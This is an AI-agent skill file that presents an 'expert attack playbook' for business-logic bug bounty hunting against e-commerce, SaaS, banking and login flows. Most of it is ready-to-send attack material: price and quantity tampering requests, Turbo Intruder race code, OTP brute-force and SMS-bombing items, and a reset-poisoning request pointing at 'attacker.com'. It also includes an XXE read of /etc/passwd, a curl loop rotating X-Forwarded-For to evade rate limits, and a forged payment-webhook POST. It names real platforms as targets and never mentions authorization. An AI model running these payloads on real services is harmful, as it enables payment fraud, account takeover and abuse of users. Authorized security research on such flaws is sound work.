---
name: business-logic
description: Business logic vulnerability playbook — price/quantity manipulation, coupon/discount abuse, race conditions, workflow step-skip, payment bypass, privilege escalation via parameters, account takeover via logic errors, subscription tier confusion, CAPTCHA abuse, and comprehensive checklists for e-commerce/SaaS/financial/auth domains. Scanner-invisible and high-reward on bug bounty.
sources:
  - hack-skills/skills/business-logic-vulnerabilities
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Business Logic Vulnerabilities — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Business logic flaws are scanner-invisible and high-reward on bug bounty. This skill covers race conditions, price manipulation, workflow bypass, coupon/referral abuse, negative values, state machine attacks, account takeover via logic errors, and privilege escalation via parameters. These require human reasoning, not automation.

## 0. RELATED ROUTING

- [auth](../auth/SKILL.md) — authentication bypass, 2FA bypass, password reset flaws
- [idor](../idor/SKILL.md) — IDOR/BOLA from business logic authorization gaps
- [race-condition](../race-condition/SKILL.md) — detailed race condition tooling

---

## 1. PRICE AND VALUE MANIPULATION

### 1.1 Negative Quantity / Price

Many applications validate "amount > 0" but not for currency:

```
Add to cart with quantity: -1
Update quantity to: -100
{"quantity": -5, "price": -99.99}   ← may be accepted
```
**Impact**: Receive credit to account, items for free, bank transfers in reverse.

### 1.2 Decimal Quantity — "0元购" Case

Real case: an e-commerce app accepted **fractional quantity** because backend trusted client float values:

```json
{"id": 114016, "skuQty": 0.02}
// Original price ¥500 → final price ¥10
// Food delivery variant: FoodNum=0.01 → 68元 item → 0.68元 charge
```
Server multiplies `unit_price * quantity` without enforcing `quantity ∈ Z+`.

### 1.3 Drop a Required Field — Free Tier Coercion

```json
// Original
{"prizeIdList": ["6264e6948fe587000113e2d9"], ...}
// Modified — array removed entirely
{"prizeIdList": [], ...}
// Server response:
{"ok": true, "payType": "free"}
```
Backend treats "field absent" as "no paid item to enforce".

### 1.4 Integer Overflow / Underflow

```
quantity: 2147483648   ← INT_MAX + 1 overflows to negative in 32-bit
price: 9999999999999   ← exceeds float precision → rounds to 0
```

### 1.5 Rounding Manipulation

```
Item price: $0.001
Order 1000 items → each rounds down → total = $0.00

Half-price recharge bug: input ¥0.019
  Pay gateway charges ¥0.01 (rounds down)
  Wallet credits ¥0.02 (rounds up)
  Net gain: ¥0.01 per cycle
```

### 1.6 Currency/Locale Manipulation

```
1. Add item in USD
2. Change locale/currency to IDR (Indonesian Rupiah)
3. Checkout: $100 USD item becomes IDR 100 (~$0.006)

Also: modify "currency" parameter in checkout request
POST /checkout
{"currency": "IDR", "total": "100"}
```

### 1.7 Currency Exchange Rate Lag

```
1. Deposit using currency A at rate X
2. Rate changes
3. Withdraw using currency A at new rate → profit
```

### 1.8 Price Manipulation in Request

```
Attack: Modify item price directly in request body
Vulnerable code: trusts client-supplied price instead of DB lookup

POST /cart/checkout
{"item_id": 123, "price": 0.01, "quantity": 1}

Also test: edit price in GraphQL mutation, mobile API, hidden form fields
```

---

## 2. RACE CONDITIONS

### 2.1 Double-Spend / Double-Redeem

```bash
# Send same request simultaneously (~millisecond apart):
POST /api/use-coupon    ← send 20 parallel requests
POST /api/redeem-gift   ← same coupon code, parallel

# If check and update are non-atomic:
# Thread 1: check(balance >= 100) → TRUE
# Thread 2: check(balance >= 100) → TRUE (before Thread 1 deducted)
# Thread 1: balance -= 100
# Thread 2: balance -= 100 → BOTH succeed → double-spend
```

### 2.2 Race Condition Test with Burp Suite

```
1. Capture request
2. Send to Repeater → duplicate 20+ times
3. "Send group in parallel" (Burp 2023+)
4. Check: did any duplicate succeed?
```

### 2.3 Turbo Intruder — Rate Limit Bypass

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```

### 2.4 Multi-Device Concurrent VIP Subscription

Real case — service offers first-month-only discount:

```
Device A: open pay sheet (lock discount)
Device B: open pay sheet (concurrent lock)
Device A: complete payment → VIP +1 month (discount price)
Device B: complete payment → VIP +1 month (still discount price)
```
Server only checks "is new user?" at the **first** request.

### 2.5 Account Registration Race

```
Register with same email simultaneously → two accounts created → data isolation broken
Password reset token race → reuse same token twice
Email verification race → verify multiple email addresses
```

---

## 3. WORKFLOW / STEP SKIP BYPASS

### 3.1 Payment Flow Bypass

```
Normal flow: Cart → Shipping → Payment → Confirm → Order

Attack: Skip to step 5 directly
POST /api/orders/confirm {"cart_id": "1234", "payment_status": "paid"}
→ Does server trust client-sent payment_status?
```

### 3.2 Multi-Step Verification Skip

```
Password reset flow: Email → Token → Set Password

Attack: Try step 4 without completing step 3:
POST /reset/password {"email": "victim@x.com", "token": "invalid", "new_pass": "hacked"}
→ Does server check that token was properly validated?
```

### 3.3 2FA Bypass

```
Normal: Username+Password → 2FA Code → Dashboard

Attack: After password success, go directly to /dashboard
→ Is session created before 2FA completes?
→ Does /dashboard require 2FA-complete check?

Also:
- Response manipulation: change 2FA failure response to 200/true
- Code not bound to account: use your valid 2FA code on victim's session
- Unlimited attempts: brute-force 6-digit OTP (1,000,000 possibilities)
- Old codes still valid: use expired OTP
- Backup code reuse: single-use backup code works multiple times
- Remember device cookie forgeable
```

### 3.4 Filter Path Truncation Bypass — `..//` and `;`

Real case — Java Servlet Filter checks login by inspecting URI string:

```
Protected:  http://target/admin/index.jsp           → 302 to /login
Bypass:     http://target/admin/../../index.jsp     → 200 (filter sees "../..", parser collapses)
Bypass:     http://target/;/admin/doLogin.action    → 200
            ^-- Servlet treats ";" as path parameter, filter uses getRequestURI()
                which sees "/;/admin/", doesn't match "/admin/", lets through
```

### 3.5 Re-using Completed Workflow Tokens

```
1. Complete checkout successfully
2. Replay the final checkout confirmation request
3. If idempotent: get order placed twice for one payment

Also: replay password reset confirmation token after it was used
      replay email verification token after account verified
```

### 3.6 Real-Name Verification Replay-To-Reset

```
1. Submit real-name auth with intentionally wrong cardNumber
   → server returns 200/success but marks as "rejected"
2. Server marks state as "rejected" but doesn't lock the user
3. UI lets account go back into "edit identity" state
4. Resubmit with another identity → real-name binding repeats indefinitely
```

---

## 4. COUPON AND REFERRAL ABUSE

### 4.1 Coupon Stacking

```
Test: Can you apply multiple coupon codes?
Test: Does "SAVE20" + promo stack to >100%?
Test: Apply coupon, remove item, keep discount applied, add different item
Test: Array params for multiple coupons: couponid[0]=A&couponid[1]=B
```

### 4.2 Coupon Reuse via Race Condition

```
Send same coupon-apply request 20x in parallel
If check and mark are non-atomic → discount applied multiple times
```

### 4.3 Coupon Code Enumeration

```
Brute-force patterns: PROMO2024, SAVE10, DISC20, SUMMER23
Tool: Burp Intruder with common coupon wordlist
Check: rate limiting, account lockout, sequential pattern (PROMO001, PROMO002...)
```

### 4.4 Referral Loop

```
1. Create Account_A
2. Register Account_B with Account_A's referral code → both get credit
3. Create Account_C with Account_B's referral code
4. Ad infinitum with throwaway emails → Infinite credit generation
```

### 4.5 Coupon = Fixed Dollar Amount on Variable-Price Item

```
Coupon: -$5 off any order
Buy item worth $3, use -$5 coupon → net -$2 (credit balance)
```

---

## 5. AUTHENTICATION / ACCOUNT LOGIC FLAWS

### 5.1 Password Reset Poisoning

```
Attack: Manipulate password reset link destination via Host header
POST /forgot-password
Host: attacker.com

email=victim@example.com

Result: Reset link sent with attacker.com domain → capture token
Also try: X-Forwarded-Host: attacker.com header
```

### 5.2 Password Reset Token Flaws

```
1. Token not bound to email: use token from your account to reset victim's password
   - Request reset for account A → get token T
   - Submit token T but specify victim's email in body

2. Token predictability: sequential, timestamp-based, username-MD5
   PHP/legacy on Windows uses rand() with RAND_MAX=32768:
   for ($a = 0; $a <= 32768; $a++) { echo md5($a)."\n"; }
   → iterate dictionary against /resetpassword.php?id=<hash>

3. Token reuse: token not invalidated after use

4. Response-based bypass:
   - Intercept reset response
   - Change 403 → 200 → see if password changed
```

### 5.3 Email Verification Bypass

```
1. Register with email A (legitimate, verified)
2. Change email to B (attacker's email, unverified)
3. Use account as verified — does server enforce re-verification?

Or: Change email to victim's email → no verification → account claim
```

### 5.4 Password Reset Token Binding

```
1. Request password reset for your account → get token
2. Change your email address (account settings)
3. Reuse old password reset token → does it still work?
```

### 5.5 OAuth Account Linking / Merge Flaws

```
Scenario 1 — CSRF on OAuth linking:
- OAuth account linking without CSRF protection
- Victim clicks attacker's crafted link
- Attacker's social account linked to victim's account
- Attacker logs in via own social account → access victim's account

Scenario 2 — Email match account merge:
1. Have victim's email (but not their password)
2. Register with victim's email → account with same email
3. Link OAuth (Google/GitHub) to your account
4. Victim logs in with Google → server finds email match → merges with YOUR account

Scenario 3 — Email change without verification:
- Change email to victim's
- Request password reset to that email
- Take over victim's account
```

### 5.6 Email/Username Normalization

```
Test variations:
- admin@gmail.com vs Admin@gmail.com (case sensitivity)
- user+extra@gmail.com vs user@gmail.com (plus addressing)
- user@domain.com vs user@DOMAIN.COM (domain case)
- Unicode normalization: café@domain.com vs cafe@domain.com
- Whitespace: " admin@domain.com" vs "admin@domain.com"

If accepted: may be treated as same address in some contexts, different in others → ATO
```

### 5.7 Cookie Replacement — Horizontal/Vertical Privilege Escalation

```
1. Login as super-admin → capture request, copy Cookie
2. Logout, login as plain user → capture another request to SAME endpoint
3. Replay plain-user request but swap Cookie with admin's token
4. If response returns admin-only data → vertical escalation
   If it returns another-user's data → horizontal escalation
```

### 5.8 Permission Residue from Database Inconsistency

```sql
SELECT menu_id, COUNT(*) FROM sys_menu GROUP BY menu_id, role_id HAVING COUNT(*) > 1;
-- Duplicate rows keep API accessible even after UI revokes the permission
```

---

## 6. PRIVILEGE ESCALATION VIA BUSINESS LOGIC

### 6.1 Parameter-Based Role Escalation

```
Attack: Include role/privilege parameters in registration or profile update
POST /register
{"username": "attacker", "email": "x@x.com", "password": "pass", "role": "admin"}

POST /profile/update
{"bio": "test", "isAdmin": true, "role": "superuser", "accountType": "premium"}

Look for: role, group, type, tier, level, isAdmin, is_admin, admin fields
```

### 6.2 Horizontal → Vertical via IDOR

```
1. Access /api/users/1 (admin account) via IDOR
2. Use discovered admin API key/token
3. Or: modify admin's password via IDOR to gain admin access
```

### 6.3 Feature Flag / Beta Feature Abuse

```
GET /api/feature-flags → find disabled features
Requests with: ?beta=true, header: X-Beta-Access: true,
              cookie: beta_tester=1, parameter: plan=enterprise

Also: check JS source for disabled feature toggles/conditions
```

### 6.4 Java Web "No Filter, No Spring Security" Anti-Pattern

```bash
find . -name "*.java" -exec grep -l "Filter" {} \;
find . -name "*.java" -exec grep -l "@PreAuthorize\|@Secured" {} \;
# If both empty: every controller is wide-open
```

### 6.5 Spring Security `antMatchers` Coverage Gap

```java
.antMatchers("/system/user/info").authenticated()
// But /system/user/list is NOT protected
// Or /system/menu/** is admin-only but /system/dept/treeData is open
```
Cross-check controller annotations against SecurityConfig.

---

## 7. PAYMENT AND FINANCIAL LOGIC FLAWS

### 7.1 Payment Method Bypass

```
1. Test credit card numbers accepted (4111111111111111)
2. Payment provider sandbox mode active in production
3. Free trial activated without payment info validation
4. Payment request skipped: directly hit /order/complete endpoint
5. Payment amount manipulation: change amount field to 0 or $0.01
```

### 7.2 Refund Abuse

```
1. Buy item → request refund → keep item → reorder with store credit
2. Submit refund request twice (race condition) → double credit
3. Request refund after chargeback (double money back)
4. Gift card refund → reload gift card balance → refund again
```

### 7.3 Object State Manipulation

```
order.status = "pending"
→ PUT /api/orders/1234 {"status": "refunded"}   ← self-trigger refund
→ PUT /api/orders/1234 {"status": "shipped"}    ← mark shipped without shipping
```

### 7.4 Transaction Reuse

```
1. Initiate payment → get transaction_id
2. Complete purchase
3. Reuse same transaction_id for second purchase:
   POST /api/checkout {"transaction_id": "USED_TX", "cart": "new_cart"}
```

---

## 8. SUBSCRIPTION / TIER CONFUSION

### 8.1 Access Premium Features After Downgrade

```
1. Subscribe to premium plan
2. Immediately downgrade to free plan via API
3. Check: do premium features persist despite downgrade?
4. Payment cycle manipulation: cancel mid-cycle, retain access
```

### 8.2 Direct API Call to Premium Endpoint

```
Free tier: cannot access feature X
Attack: Directly call premium endpoint with free account token
Server checks subscription for UI but not API?
```

### 8.3 Direct Media URL Leak — VIP Resource Bypass

Search all detail/preview/playback responses for:
```
.flv  .m3u8  .mp4  .mp3  videoUrl  downloadUrl  streamUrl  previewPullUrl
```
Replay the URL anonymously (curl, VLC). If it plays without a session, VIP gating is broken.

### 8.4 Resource ID Replacement — Free → Paid Content

```
Free course ID in URL: /course/60caa21e853f5c1651b27c1b
Replace with known paid course ID → IDOR on premium content
```

---

## 9. CAPTCHA / VERIFICATION CODE ABUSE

```
□ Code returned in plaintext in HTTP response
□ Receiver tampering: change phone/email param to attacker-controlled
□ Empty / fixed code accepted (000000, blank, "test")
□ Drop the code field entirely → request still succeeds
□ Cross-account reuse (A's valid code accepted on B's flow)
□ Brute force 4-6 digit code (no attempt limit)
□ SMS bombing (no rate limit per IP / per phone)
```

---

## 10. API VERSIONING / HIDDEN ENDPOINTS

```
Attack: Older API versions may lack security controls of current version
Test:
- /api/v1/users/delete (deprecated but still works)
- /api/v2/admin vs /api/v1/admin (v1 missing auth check)
- Mobile API (/mobile/api/ or /app/api/) may be less restricted
- Undocumented endpoints: /api/internal/, /api/debug/, /api/test/

Discovery:
- JS source code analysis (Webpack bundles)
- Mobile app decompilation
- OpenAPI/Swagger spec files (/swagger.json, /api/docs)
- Google dorking: site:target.com api v1 inurl:swagger
```

---

## 11. DATA VALIDATION LOGIC FLAWS

### 11.1 API Bypasses UI Validation

```
- Min/max field length enforcement (UI: max 100 chars → API: unlimited)
- Numeric limits (UI: 1-10 quantity → API: accepts 999)
- Date range restrictions (UI: future only → API: accepts past dates)
- File upload restrictions (UI: images only → API: accepts .php)
```

### 11.2 Trust Boundary Violations

```
- User supplies data stored in admin section → admin displays it → stored XSS
- Webhook receives data from partner → stored without sanitization
- Import CSV → cells contain formulas → CSV injection in admin export
```

---

## 12. TESTING APPROACH

```
For each business process:
1. Map the INTENDED flow (happy path)
2. Ask: "What if I skip step N?"
3. Ask: "What if I send negative/zero/MAX values?"
4. Ask: "What if I repeat this step twice?" (idempotency)
5. Ask: "What happens if I do A then B instead of B then A?"
6. Ask: "What if two users do this simultaneously?"
7. Ask: "Can I modify the 'trusted' status fields?"
8. Think from financial/resource impact angle → highest bounty
```

---

## 13. HIGH-IMPACT CHECKLISTS BY DOMAIN

### E-Commerce / Payment

```
□ Negative quantity / decimal quantity (skuQty=0.02, FoodNum=0.01) in cart
□ Drop required fields (delete prizeIdList) to coerce free tier
□ amount=999999999 integer overflow → final 0
□ Apply multiple conflicting coupons via array params
□ Race condition: double-spend gift card / same coupon
□ Skip payment step directly to order confirmation
□ Server-trusted client status fields (payment_status=paid, success:true)
□ Refund without return (trigger refund on delivered item via state change)
□ Multi-device concurrent VIP subscription
□ Currency rounding exploitation (¥0.019 charge → ¥0.02 wallet credit)
□ Currency locale switch (USD → IDR)
□ Negative shipping fee fields decreasing total (shipping_fee = -500)
□ Receiver-account redirect (merchant_id / receiver_account swap on withdraw)
□ Coupon code enumeration (sequential pattern)
□ Flash sale quantity bypass (buy more than limit)
```

### SaaS / Subscription

```
□ Access premium features after downgrade
□ Cancel subscription → retain access beyond billing period
□ Trial restart (delete account and re-register with same email)
□ Feature flag manipulation (enable disabled features via ?beta=true)
□ Usage limit bypass (quota increment vs quota check race)
□ API rate limit bypass via multiple API keys
□ Direct API call to premium endpoints without subscription check
□ Direct media URL exposure in JSON (.flv / .m3u8 / .mp4 in response)
```

### Financial / Banking

```
□ Transfer to self → check if balance increases (double credit)
□ Transfer to non-existent account → funds lost but balance debited?
□ Minimum balance bypass (transfer below minimum threshold)
□ Transaction replay
□ Decimal precision abuse (transfer $0.001 for free?)
□ Currency conversion arbitrage
□ Overdraft logic (can balance go negative?)
```

### Authentication Flows

```
□ 2FA bypass: skip step, response manipulation, code not bound to account
□ Password reset: token reuse, predictable tokens, Host header poisoning
□ Account merge/link: CSRF on OAuth linking
□ Email normalization: case, plus addressing, Unicode
□ Registration: role parameter injection, unverified email allowed
□ Session: session not invalidated on logout/password change
□ CAPTCHA: code in response, blank accepted, cross-account reuse
□ Real-name verification replay-to-reset
□ Java Servlet Filter path truncation bypass (;path, ../../)
□ Spring Security antMatchers coverage gap
□ Permission residue from duplicate rows in auth table
```

### CSRF / SSRF / XXE

```
□ CSRF on state-changing endpoint (no token, no SameSite, no origin check)
□ Payment / withdrawal CSRF via auto-submitting hidden form
□ Login CSRF (force victim to log into attacker account)
□ JSONP / JSONP-callback exploitation as CSRF read primitive
□ SSRF via image-import / webhook / preview URL
□ XXE file read (<!ENTITY x SYSTEM "file:///etc/passwd">)
```


---

## Hunt Methodology (Claude-BugHunter — real BB reports)

## Crown Jewel Targets

Business logic vulnerabilities pay highest in platforms where financial transactions, identity verification, and access controls intersect with real-world consequences. The richest targets are:

- **E-commerce & payment platforms** (Valve/Steam, Shopify) — payment flow manipulation, free goods, price tampering
- **Marketplace & gig economy apps** (Airbnb, Uber) — identity/verification bypass enabling fraud or unsafe interactions
- **SaaS with tiered access** (Mozilla Monitor) — bypassing verification to unlock monitoring features without entitlement
- **High-traffic consumer apps** (Snapchat, Yelp) — rate-limit bypass enabling spam, enumeration, or abuse at scale

Asset types that pay: checkout flows, subscription endpoints, callback/verification systems, webhook handlers, employee/internal portals exposed to the internet, and any endpoint that trusts client-supplied data to make authorization decisions.

---

## Attack Surface Signals

**URL patterns to watch:**
- `/checkout`, `/order`, `/subscribe`, `/payment`, `/verify`, `/confirm`, `/callback`
- `/internal`, `/employee`, `/summit`, `/staff`, `/admin` — internal pages accidentally public
- `/api/v*/payment`, `/api/v*/notify`, `/webhook` — payment provider callbacks
- Endpoints accepting `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP` headers

**Response/header signals:**
- `Set-Cookie` with unvalidated session state tied to cart or order data
- Payment provider names in responses: `Smart2Pay`, `Stripe`, `PayPal`, `Braintree`
- Redirect chains through third-party payment pages (in-flight data opportunity)
- `200 OK` on subscription/verification endpoints with no CAPTCHA or token

**JS patterns:**
- Hardcoded internal URLs in frontend bundles (`/employee/`, `/staff/`, `/internal/`)
- Client-side price calculation before server submission
- Verification logic that only checks on the frontend (`if (verified) { ... }`)
- `fetch('/api/subscribe', { method: 'POST', body: ... })` with no anti-CSRF token or rate-limit token

**Tech stack signals:**
- Shopify storefronts with draft/unpublished channel pages
- Apps using IP-based rate limiting without session/account binding
- Payment webhooks with no HMAC signature validation
- SMS/phone callback flows that don't verify ownership before enabling features

---

## Step-by-Step Hunting Methodology

1. **Map all authentication boundaries.** Spider the target. Identify pages/endpoints that serve authenticated content (employee portals, premium features, order pages) and test each unauthenticated. Look for internal pages indexed in JS bundles or linked from robots.txt/sitemap.xml.

2. **Identify every verification flow.** Enumerate: email verification, phone/SMS verification, payment verification, CAPTCHA, age gates. For each, test: what happens if you skip the verification step entirely? What happens if you replay a valid token on a different account?

3. **Test rate-limiting controls on every form.** For every POST endpoint (subscribe, login, OTP, search), send 50+ rapid requests. Vary: remove cookies, rotate `X-Forwarded-For` / `X-Real-IP` headers, change `User-Agent`. Check if the server uses IP from headers rather than connection IP.

4. **Intercept and tamper with payment flows.** Use Burp Suite to intercept every request between your browser, the application, and the payment provider. Identify where price, currency, order ID, or status fields are set. Attempt to modify amounts to $0.01 or currency to a low-value currency. Look for POST-back/webhook endpoints that accept payment confirmation — test if they validate HMAC/signature.

5. **Test phone/callback number verification.** Whenever a platform accepts a callback number, test: can you set it to a number you don't own? Does the platform call/text that number and grant trust based solely on submission? Try setting it to a victim's number.

6. **Check for unprotected employee/internal surfaces.** Search Shodan, GitHub, JS bundles, and Wayback Machine for internal subdomain/path references. Test access without authentication. Check if these surfaces allow order placement, data access, or privilege escalation.

7. **Validate business impact.** For each finding, determine: does this result in financial loss, unauthorized access, or data exposure? Document the end-to-end chain.

---

## Payload & Detection Patterns

**Rate limit bypass via header rotation:**
```bash
# Rotate X-Forwarded-For to bypass IP rate limiting
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/api/subscribe \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "X-Real-IP: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim+'"$i"'@example.com"}' \
    -o /dev/null -w "%{http_code}\n"
done
```

**Payment tampering — modify in-flight price:**
```http
POST /payment/initiate HTTP/1.1
Host: target.com

amount=0.01&currency=USD&order_id=12345&product_id=99
```
```bash
# Look for unvalidated webhook endpoints
curl -X POST https://target.com/payment/callback \
  -H "Content-Type: application/json" \
  -d '{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}'
```

**Unauthenticated internal page discovery:**
```bash
# Check robots.txt and sitemap for internal paths
curl -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 
curl -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"

# Grep JS bundles for internal paths
curl -s https://target.com/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u
```

**Email verification bypass:**
```bash
# Skip the verification step: hit the post-verification API endpoint directly
# with an unverified session. If it succeeds, the gate is UI-only.
curl -s -X POST https://monitor.target.com/api/monitoring/enable \
  -H "Cookie: session=<your_unverified_session>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Replay verification token on different account
curl -X POST https://target.com/verify \
  -d 'token=VALID_TOKEN_FROM_ACCOUNT_A&email=account_b@example.com'
```

**Grep patterns for client-side logic issues:**
```bash
# Find price calculations in JS
grep -iE "(price|amount|total|cost)\s*[=*+]" app.js

# Find internal URLs in JS bundles
grep -oE '"/(employee|internal|staff|admin|summit)[^"]*"' *.js

# Find unvalidated IP header usage in server code
grep -iE "x-forwarded-for|x-real-ip|cf-connecting-ip" src/ -r
```

---

## Common Root Causes

1. **Server trusts client-supplied data for financial decisions.** Developers offload price calculation to the frontend or pass amount fields through forms/URLs without re-validating on the server against a canonical source (the product database).

2. **Verification is enforced only in the UI, not the API.** Frontend hides features behind a verification gate, but the backend API endpoints are fully functional without a verified status — any authenticated request succeeds.

3. **IP-based rate limiting reads from spoofable headers.** Developers implement rate limits using `request.headers['X-Forwarded-For']` instead of the actual connection IP, allowing trivial bypass by header manipulation.

4. **Payment webhooks lack signature validation.** Developers implement "success" webhooks without verifying the HMAC signature provided by the payment provider, allowing anyone to POST a fake success notification.

5. **Internal/employee pages aren't access-controlled.** Internal tools are deployed to production domains without authentication middleware, either because developers assume obscurity (unlisted URL) or forgot to apply auth to a new route.

6. **Phone/callback verification is advisory, not enforced.** Systems accept a phone number and grant trust to whoever submitted it, without confirming the submitter owns or controls that number.

7. **Draft/channel-specific storefronts inherit full order functionality.** Platforms like Shopify allow creating storefronts for specific channels (employee events) that are unlisted but still fully functional for order placement if the URL is known.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| IP-based rate limiting | Rotate `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP` headers per request |
| CAPTCHA on subscription forms | Use header-based bypass first; if CAPTCHA is only on the web form, call the underlying API endpoint directly |
| Email verification gate | Access the post-verification API endpoint directly; replay valid tokens; check if `verified=true` is a client-set cookie/param |
| Payment amount server validation | Modify currency to a lower-value currency; test with $0.00 or negative amounts; manipulate order IDs to reference different products |
| Webhook HMAC validation | Test with no/empty signature header (is validation enforced at all — a modified payload only "passes" if it isn't); replay an UNMODIFIED captured webhook to test missing idempotency/anti-replay |
| Auth on internal pages | Try unauthenticated; try with a low-privilege account; try path traversal variants (`/employee/../employee/`) |
| Phone verification (OTP sent) | Submit someone else's number without OTP validation; check if the system grants trust on submission vs. OTP confirmation |

---

## Gate 0 Validation

Before writing any report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "An unauthenticated user can place an order for physical goods at $0 cost" or "An attacker can bypass email verification and monitor any email address without owning it" or "An attacker can send unlimited subscription emails to any address." Vague impact = reject.

2. **What does the victim LOSE?**
   Identify a concrete, attributable loss: financial loss (free goods, fraudulent payments), privacy loss (phone number spoofed, unauthorized monitoring), service abuse (spam campaigns via rate-limit bypass), or security degradation (unverified identity trusted for sensitive actions). If the loss is purely theoretical, re-evaluate severity.

3. **Can it be reproduced in 10 minutes from scratch?**
   Create a fresh account (or use no account). Follow your documented steps. Achieve the impact. If you can't reliably reproduce it end-to-end in under 10 minutes with the steps you've written, your methodology is incomplete — refine before submitting.

---

## Real Impact Examples

**Scenario 1 — Free Physical Goods via Exposed Internal Storefront (Shopify-style)**
An employee summit page was deployed to a public Shopify storefront as a private channel for distributing free books to staff. The URL was discoverable via JS bundle analysis or link sharing. An anonymous user who navigated to the URL could browse and complete a checkout with no authentication required, receiving physical merchandise shipped at the company's expense. Impact: direct financial loss per order, potential for bulk ordering if not caught quickly.

**Scenario 2 — Payment Manipulation via In-Flight Tampering (Valve/Steam-style)**
A payment flow passed order amount and currency through client-controlled parameters before redirecting to a third-party payment provider (Smart2Pay). By intercepting the redirect with Burp Suite and modifying the amount field, an attacker could complete a real payment for $0.01 while the application's webhook — lacking HMAC validation — accepted the provider's confirmation and credited the full item/service to the account. Impact: critical financial loss; attacker receives full value goods/services for near-zero cost, infinitely repeatable.

**Scenario 3 — Email Verification Bypass for Unauthorized Monitoring (Mozilla-style)**
A breach-monitoring service required email verification before enabling monitoring alerts for an address. The verification check was enforced in the UI flow but the underlying API accepted monitoring setup requests for any address using a valid session — skipping the verification step entirely. An attacker could set up monitoring for email addresses they don't own, receiving breach notification data (potentially including credential exposure status) for victim accounts. Impact: privacy violation; attacker gains intelligence on whether a target's email was in a breach without the target's knowledge or consent.

---

## Disclosed Report Citations (Backfill +5 — 2016-2023)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. All five share a measurable financial-impact angle (actual $ loss demonstrated or quantifiable platform-wide exposure).

8. **Stripe — Fee discount race redemption** ([H1 #1849626](https://hackerone.com/reports/1849626))
    - Subclass: coupon/discount race-multi-redemption + financial primitive
    - Payload: Stripe Support applied a one-time $20,000 fee-credit. Researcher captured the "accept-discount" POST and replayed it 30× in parallel via Burp Turbo Intruder, each acceptance crediting the account anew
    - Root cause: idempotency missing on discount-acceptance endpoint; no unique constraint on (account_id, discount_id)
    - Year: 2023 — **$5,000**, $600,000 of fee-free transactions accrued before fix (~$18,000 real Stripe loss at 3% take rate)

9. **Reverb.com — Gift-card race multi-redemption** ([H1 #759247](https://hackerone.com/reports/759247))
    - Subclass: gift-card / store-credit race-redemption
    - Payload: single valid gift card, parallel-POST to `/redeem` from 10 sockets via Turbo Intruder. Balance credits N× the face value
    - Root cause: no row-level lock on gift_card table; balance debit and credit live in separate transactions
    - Year: 2019 — **$1,500**

10. **Upserve / OLO — Negative-quantity price manipulation** ([H1 #364843](https://hackerone.com/reports/364843))
    - Subclass: negative-quantity-in-cart price tampering
    - Payload: `POST /api/order {"items":[{"id":1,"qty":1,"price":50},{"id":2,"qty":-3,"price":50}]}` — order total computes to `-$100`, floors to ~$0 at payment capture, food still fulfills
    - Root cause: server multiplies `qty * price` with no `qty >= 1` guard
    - Year: 2018 — textbook citation for the subclass (acknowledged-only program)

11. **Krisp — Pay-less-per-seat via PUT tampering** ([H1 #1446090](https://hackerone.com/reports/1446090))
    - Subclass: price-per-unit mass-assignment / quantity-discount manipulation
    - Payload: `PUT /v2/seats` body includes a server-trusted `price` field. Set `price=1` instead of $60. Subscription updates, billing engine charges $1/seat for 100 seats
    - Root cause: server reads price from request body instead of looking it up by plan_id; classic mass-assignment
    - Year: 2021 — Stripe-billed SaaS pricing exposure

12. **Stripe — Pay using archived price via mid-flow swap** ([H1 #1328278](https://hackerone.com/reports/1328278))
    - Subclass: cart-state TOCTOU / cancel-then-deliver (price-version race at checkout)
    - Payload: merchant archives an old price (e.g., $5 instead of new $50). Buyer starts checkout via the new payment-link, then mid-flow swaps `price_id` back to the archived one. Stripe charges $5; subscription provisions at the new tier
    - Root cause: payment-link validates "is active", price object validates "exists" — but the join "price.active AND price ∈ link.allowed_prices" is missing
    - Year: 2021 — Stripe Medium (per-subscription recurring loss)

---

## Related Skills & Chains

- **`hunt-race-condition`** — Every uniqueness/quota check in a logic flow is a race candidate. Chain primitive: Business logic (coupon/credit/promotion) + race condition → coupon redeemed N times in a single TCP packet via Turbo Intruder.
- **`hunt-idor`** — Logic flows that trust a client-supplied identifier (order_id, tenant_id, beneficiary_id) overlap directly with IDOR. Chain primitive: business-logic step-skip + IDOR on beneficiary_id → transfer funds from victim account.
- **`hunt-api-misconfig`** — Step-skip and verification-bypass often live next to mass-assignment fields. Chain primitive: business-logic email-verify skip + API mass assignment (`verified:true, role:admin`) → ATO without email control.
- **`hunt-ato`** — Logic bugs in password reset, email change, and recovery flows are core ATO paths. Chain primitive: business logic (email change accepts without re-auth) + `hunt-ato` Path 2 → silent victim email swap → password reset to attacker mailbox.
- **`security-arsenal`** — Load the Business-Logic Probe Checklist (negative quantity, decimal overflow, currency swap, step-skip via direct URL nav, state-machine reverse) and the Always-Rejected list to avoid filing self-inflicted bugs.
- **`triage-validation`** — Apply the 7-Question Gate (especially Q4 "Is this exploitable by an outside attacker without unrealistic preconditions?"): logic bugs need a concrete dollar/PII/state impact, not just "the flow looks weird".

